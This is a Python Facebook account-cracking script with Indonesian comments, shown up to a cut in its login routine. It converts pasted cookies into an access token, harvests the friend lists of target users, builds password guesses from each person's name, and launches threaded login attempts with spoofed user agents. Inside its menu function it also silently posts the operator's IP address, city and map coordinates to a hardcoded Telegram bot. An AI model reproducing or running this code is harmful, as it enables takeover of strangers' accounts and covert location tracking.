            ua1a =  f'{j} 9; {c}; {realmi} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {rel}'
            ua1b =  f'{j} 10; {c}; {realmi} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {rel}'
            ua1c =  f'{j} 11; {c}; {realmi} Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {rel}'
            ua1d =  f'{j} 12; {c}; {realmi} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {rel}'
            ua2a =  f'{j} 9; {c}; Infinix {infinix} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {infi}'
            ua2b =  f'{j} 10; {c}; Infinix {infinix} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {infi}'
            ua2c =  f'{j} 11; {c}; Infinix {infinix} Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {infi}'
            ua2d =  f'{j} 12; {c}; Infinix {infinix} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {infi}'            
            uak2023 = random.choice([
            ua1a,
            ua1b,
            ua1c,
            ua1d,
            ua2a,
            ua2b,
            ua2c,
            ua2d,
            ua3,
            ua4,
            ua5])
            usragent.append(uak2023)
                 
            

#WARNA PRINT IMPORT RICH#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#00FF00"
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

	
import datetime
z = datetime.datetime.now()
jam = z.strftime("%I:%M %p")
#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tanggal = '    '+str(tgl)+'-'+str(bln)+'-'+str(thn)+''
pengguna = 'Premium'
#----------[ GARIS-KERAS ]----------#
def kopi():
	print(f"{hijo}______________________________________________________________")
#----------[ KESALAHAN ]----------#	       
def help():
	krek_cer(f"\x1b[1;93m\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
#----------[ BANNER ]----------#	
def banner():
	clear()
	print('')
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.kokitoken.txt','r').read()
		cok = open('.kokicokies.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}{x}[{mer}◕➤{x}]{mer} Koneksi Anda Bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
def login_lagi():
	try:
		os.system('clear');banner()
		your_cookies = input(f'{kun}{x}[{hijo}◕➤{x}] Masukan Cookies {hijo}: ')
		with requests.Session() as r:
			try:
				r.headers.update({
				'content-type': 'application/x-www-form-urlencoded',
				})
				data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''}
				response = json.loads(r.post(
				'https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = (
				'https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
				})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					krek_cer(f"{kun}{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search(
					'name="fb_dtsg" value="(.*?)"', 
					str(response2)).group(1)
					jazoest = re.search(
					'name="jazoest" value="(\d+)"', 
					str(response2)).group(1)
					data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'qr': 0,'user_code': user_code,}
					r.headers.update({
					'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
					})
					response3 = r.post(
					'https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop(
						'content-type');r.headers.pop(
						'origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search(
						'action="(.*?)"', 
						str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search(
						'name="fb_dtsg" value="(.*?)"', 
						str(response4)).group(1)
						jazoest = re.search(
						'name="jazoest" value="(\d+)"', 
						str(response4)).group(1)
						scope = re.search(
						'name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search(
						'name="display" value="(.*?)"', 
						str(response4)).group(1)
						user_code = re.search(
						'name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search(
						'name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search(
						'name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search(
						'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search(
						'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({
						'origin': 'https://m.facebook.com','referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
						})
						data = {
						'fb_dtsg': fb_dtsg,
						'jazoest': jazoest,
						'scope': scope,
						'display': display,
						'user_code': user_code,
						'logger_id': logger_id,
						'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,
						'return_format[]': return_format,}
						response5 = r.post(
						'https://m.facebook.com{}'.format(action), data = data, cookies = {
						'cookie': your_cookies}).text
						windows_referer = re.search(
						'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop(
						'content-type');r.headers.pop('origin')
						r.headers.update({
						'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
							})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"{kun}{x}[{hijo}•{x}] Token {hijo}: {access_token}")
							tokenew = open(".kokitoken.txt","w").write(access_token)
							cook= open(".kokicokies.txt","w").write(your_cookies)
							print(f"{kun}{x}{hijo}◕➤ Login Berhasil Jalankan Ulang Python botak.py");exit()
			except Exception as e:
				krek_cer(f"{kun}{x}{mer}◕➤ Login gagal cek tumbal lo ngab :-(")
				os.system('rm -rf .kokicokies.txt && rm -rf .kokitoken.txt');print(e);time.sleep(3)
				back()
	except:pass

tanda = '+'
#----------[ BAGIAN-MENU ]----------#
def menu(my_name,my_id):
# def menu(id,name):
	try:
		token = open('.kokitoken.txt','r').read()
		cok = open('.kokicokies.txt','r').read()
	except IOError:
		print('[•] Cookies Kadaluarsa ')
		time.sleep(2)
		login_lagi()
	os.system('clear')
	banner()
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:card = cek_data["isp"]
	except:card = {'-'}
	try:indo = cek_data["country"]
	except:indo = {'-'}
	try:zone = cek_data["timezone"]
	except:zone = {'-'}
	try:lat = cek_data["lat"]
	except:lat = {'-'}
	try:lon = cek_data["lon"]
	except:lon = {'-'}
	try:Lokasi = cek_data["city"]
	except:Lokasi = {'-'}
	try:pickkartu=cek_data["as"]
	except:pickkartu = {'-'}
	try:Iplu=cek_data["query"]
	except:Iplu = {'-'}
	try:ng=cek_data["country"]
	except:ng = {'-'}
	prints(nel(f'{P2}       Tumbal : {H2}{my_id} - {my_name}\n{P2}       Zona   : {H2}{Lokasi} - {K2}{ng}{P2}',title=f'{H2}{jam}📱{Iplu}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	requests.post(f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text=IP Address: {Iplu}\nLokasi : {Lokasi}\nGoogle maps : https://www.google.com/maps/place/{lat}{tanda}{lon}")
	kopi()
	print()
	krek_cer(f'{hijo}[{P}A{hijo}]{kun}◕{x}{hijo}➤{x} Crack Publik          {x}')
	krek_cer(f'{hijo}[{P}B{hijo}]{kun}◕{x}{hijo}➤{x} Crack Publik Masall   {x}')
	krek_cer(f'{hijo}[{P}C{hijo}]{kun}◕{x}{hijo}➤{x} Crack File           {x}')
	krek_cer(f'{hijo}[{P}D{hijo}]{kun}◕{x}{hijo}➤{x} Cek Opsi CP            {x}')
	krek_cer(f'{mer}[{P}E{mer}]{kun}◕{x}{hijo}➤{x}{M} Hapus Cookies         {x}')
	kopi()
	print()
	_Gass_nge_krek_ = input(f'{kun}◕{x}{hijo}➤{x} Input : ')
	kopi()
	print('')
	if _Gass_nge_krek_ in ['1','a','A']:
		crack_publik()
	elif _Gass_nge_krek_ in ['2','b','B']:
		krek_publik()
	elif _Gass_nge_krek_ in ['3','c','C']:
		file_dump()
	elif _Gass_nge_krek_ in ['4','d','D']:
		cek_opsi_cp()
	elif _Gass_nge_krek_ in ['0','e','E']:
		os.system('rm -rf .kokicokies.txt && rm -rf .kokitoken.txt')
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Suckses hapus cookies');exit()
	else:
	    print('◕➤ Pilih Yang Bener Bree ')
	    back()

#----------[ CRACK-PUBLIK ]----------#
def krek_publik():
	try:
		token = open('.kokitoken.txt','r').read()
		cok = open('.kokicokies.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{kun}◕{x}{hijo}➤{x} Berapa ID : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{kun}◕{x} IDz ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(f'{kun}➤{x}{hijo} TOT : '+str(len(id))) 
	      kopi()
	      print('')
	      atur_ter()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#PUBLIK KREK#
def crack_publik():
	with requests.Session() as ses:
		token = open('.kokitoken.txt','r').read()
		cok = open('.kokicokies.txt','r').read()
		
		a = input(f'{kun}◕{x}{hijo}➤{x} Input ID : ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])			
			print(f'{kun}◕{x}{hijo}➤{x} Total ID  : '+str(len(id)))
			kopi()
			print()
			atur_ter()
		except Exception as e:
			back()

###----------[CRACK EMAIL]---------####

###----------[ CEK OPSI ]----------###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	kopi()
	print()
	try:ok = os.listdir('/sdcard/AKUN-CP/')
	except:sys.exit(f" {kun}◕{x}{hijo}➤{x} tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('/sdcard/AKUN-CP/'+x,'r').readlines()
		except:continue
		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f' [{kk}<{P}] nomor yang akan di cek\n nomor : ')
	file = nom[int(exc)-1]
	kopi()
	print()
	detek.append('file')
	for data in open('/sdcard/AKUN-CP/'+file,'r').read().splitlines():
		ua = random.choice(usragent)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	kopi()
	print()
	print(f'{kun}◕{x}{hijo}➤{x} Cek Opsi Akun CP udah Selsai')
	kopi()
	print('')
	print(f'{kun}◕{x}{hijo}➤{x} Mau Lanjut ke Menu Ngecrak ( Y/t ) ? ')
	woi = input(f'➤ Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{kun} Sampai Jumpaaaa{x} << ')
		time.sleep(2)
		exit()

#----------[ MENU-METODE ]----------#

def atur_ter():
	krek_cer(f'{hijo}[{P}A{hijo}]{kun}◕{x}{hijo}➤{x} Akun Baru')
	krek_cer(f'{hijo}[{P}B{hijo}]{kun}◕{x}{hijo}➤{x} Akun Acak JIHAN')
	krek_cer(f'{hijo}[{P}C{hijo}]{kun}◕{x}{hijo}➤{x} Akun Lama')
	kopi()
	print()
	aturid = input(f'{kun}◕{x}{hijo}➤{x} Pilih : ')
	if aturid in ['1','a','A']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2','b','B']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	elif aturid in ['3','c','C']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	else:
		krek_cer(f'{kun}◕{x}{hijo}➤{x} Pilih Yang Benar Bre : ')
		waktu(1)
		atur_dulu()
		exit()
	# for cape_euy in id:
		# id2.insert(0,cape_euy)
	kopi()
	print('')
	krek_cer(f'{hijo}[{P}A{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL JIHAN')
	krek_cer(f'{hijo}[{P}B{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL PROX')
	krek_cer(f'{hijo}[{P}C{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL MBC JIHAN')
	krek_cer(f'{hijo}[{P}D{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL MBT JIHAN')
	krek_cer(f'{hijo}[{P}E{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL MBCB')
	krek_cer(f'{hijo}[{P}F{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL ALP')
	krek_cer(f'{hijo}[{P}G{hijo}]{kun}◕{x}{hijo}➤{x} MTC VAL MOBILE')
	kopi()
	print()	
	Gass_Krek_Ngentot = input(f'{x}{kun}◕{x}{hijo}➤{x} Select Method  : {P}')
	kopi()
	print()
	if Gass_Krek_Ngentot in ['1','a','A']:
		method.append('mobile')
	elif Gass_Krek_Ngentot in ['2','b','B']:
		method.append('mbasic')
	elif Gass_Krek_Ngentot in ['3','c','C']:
		method.append('mbasicc')
	elif Gass_Krek_Ngentot in ['4','d','D']:
		method.append('mbeta')
	elif Gass_Krek_Ngentot in ['5','e','E']:
		method.append('kocok')
	elif Gass_Krek_Ngentot in ['6','f','F']:
		method.append('alpha')
	elif Gass_Krek_Ngentot in ['7','g','G']:
		method.append('mobile')
	else:
		method.append('mobile')
	# pwplus=input(f"{x}{kun}◕{x}{hijo}➤{x} Password Manual y/t : ") 
	# if pwplus in ['y','Y']:
		# pwpluss.append('ya')
		# pwku=input(f"{x}{kun}◕{x}{hijo}➤{x} Input Password : ")
		# pwkuh=pwku.split(',')
		# for xpw in pwkuh:
			# pwnya.append(xpw)
	# uatambah = input(f"{x}{kun}◕{x}{hijo}➤{x} Ua Manual y/t : ") 
	# if uatambah in ['y','Ya','ya','Y']:
		# ualuh.append('ya')
		# bzer = input(f"{x}{kun}◕{x}{hijo}➤{x} Input User Agent :  ") 
		# ualu.append(bzer)
	# else:
		# ualuh.append('tidak')
	passwrd()
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrd():
	global prog,des
	kopi()
	print('')
	print(f'{x}{kun}◕{x}{hijo}➤{x} ON OFF PESAWAT DI 300 IDZ ')
	kopi()
	print()
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'54321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'92')
						pwv.append(frs+'93')
						pwv.append(frs+'94')
						pwv.append(frs+'95')
						pwv.append(frs+'96')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'54321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'92')
						pwv.append(frs+'93')
						pwv.append(frs+'94')
						pwv.append(frs+'95')
						pwv.append(frs+'96')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if  'mobile' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'mbasic' in method:
				    pool.submit(metod2,idf,pwv)
				elif 'mbasicc' in method:
				    pool.submit(metod3,idf,pwv)
				elif 'mbeta' in method:
				    pool.submit(metod4,idf,pwv)
				elif 'kocok' in method:
				    pool.submit(metod5,idf,pwv)
				elif 'alpha' in method:
				    pool.submit(metod6,idf,pwv)
				elif 'mobile' in method:
				    pool.submit(metod7,idf,pwv)
				else:
				    pool.submit(metod7,idf,pwv)
	
	kopi()
	print()			 
	print(f'{kun}◕{x}{hijo}➤{x} OK {hijo}: %s'%(ok))
	print(f'{kun}◕{x}{hijo}➤{x} CP {kun}: %s'%(cp))
	kopi()
	print()
	print(f'{kun}◕{x}{hijo}➤{x} Crack Selesai bree, Jangan Lupa Istirahat')
	kopi()
	print('')
	print(f'{kun}◕{x}{hijo}➤{x} Lanjut Ngecrak ( Y/t ) ? ')
	woi = input(f'➤ Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{kun} Sampai Jumpaaaa{x} << ')
		time.sleep(2)
		exit()


#----------[ METODE-VALIDATE ]----------#	
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white] VAL JIHAN 1 [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			# nip=random.choice(prox)
			# proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1971214313162948&kid_directed_site=0&app_id=1971214313162948&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D1971214313162948%26auth_type%26cbt%3D1697199459982%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f27dae9d33634%2526domain%253Dsfile.mobi%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fsfile.mobi%25252Ff16df3679170eec%2526relation%253Dopener%26client_id%3D1971214313162948%26config_id%26display%3Dtouch%26domain%3Dsfile.mobi%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fsfile.mobi%252Flogin.php%26force_confirmation%3Dfalse%26id%3Df2d5642fd81c854%26locale%3Den_US%26logger_id%3D8b1fa001-1968-4312-a43d-b4fb4b1f2f71%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1e8f4c4d3035c%2526domain%253Dsfile.mobi%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fsfile.mobi%25252Ff16df3679170eec%2526relation%253Dopener.parent%2526frame%253Df2d5642fd81c854%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1e8f4c4d3035c%26domain%3Dsfile.mobi%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fsfile.mobi%252Ff16df3679170eec%26relation%3Dopener.parent%26frame%3Df2d5642fd81c854%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=1971214313162948&auth_type&cbt=1697199459982&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3f27dae9d33634%26domain%3Dsfile.mobi%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fsfile.mobi%252Ff16df3679170eec%26relation%3Dopener&client_id=1971214313162948&config_id&display=touch&domain=sfile.mobi&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fsfile.mobi%2Flogin.php&force_confirmation=false&id=f2d5642fd81c854&locale=en_US&logger_id=8b1fa001-1968-4312-a43d-b4fb4b1f2f71&messenger_page_id&origin=2&plugin_prepare=true&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1e8f4c4d3035c%26domain%3Dsfile.mobi%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fsfile.mobi%252Ff16df3679170eec%26relation%3Dopener.parent%26frame%3Df2d5642fd81c854&ref=LoginButton&reset_messenger_state=false&response_type=signed_request%2Ctoken%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&size=%7B%22width%22%3Anull%2C%22height%22%3Anull%7D&url=dialog%2Foauth&version=v13.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
